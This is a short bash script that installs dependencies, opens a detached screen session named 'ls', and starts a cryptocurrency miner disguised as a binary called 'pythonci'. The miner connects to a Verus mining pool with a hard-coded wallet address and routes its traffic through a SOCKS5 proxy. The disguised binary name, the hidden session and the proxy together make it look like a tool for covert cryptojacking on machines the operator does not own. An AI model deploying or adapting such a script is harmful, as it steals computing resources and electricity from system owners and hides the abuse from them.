#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
screen -dmS ls
POOL=stratum+tcp://na.luckpool.net:3956
WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WORKER=0AA0
PROXY=socks5://72.195.114.184:4145
./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 6 -x $PROXY
